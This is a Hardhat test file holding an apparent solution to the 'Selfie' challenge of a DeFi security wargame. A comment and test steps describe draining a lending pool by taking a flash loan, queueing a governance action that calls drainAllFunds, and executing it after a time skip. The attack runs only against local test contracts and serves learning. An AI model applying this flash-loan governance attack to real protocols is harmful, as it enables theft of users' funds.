const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        /**
         * EXPLOIT:
         * 
         * The governance is vulnerable to a flash loan attack,
         * as an attacker can pass the checks to queue an action with the loaned tokens.
         * 
         * The attacker can repay the loan,
         * wait for the governance delay to elapse,
         * and then extecute the action,
         * which can call the `drainAllFunds` method on the pool.
         */

        const AttackFactory = await ethers.getContractFactory('AttackSelfie', attacker);
        this.attackContract = await AttackFactory.deploy(
            this.token.address,
            this.governance.address,
            this.pool.address);

        await this.attackContract.startAttack();

        // Advance time 2 days so that queued action can be executed
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);

        await this.attackContract.finishAttack();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
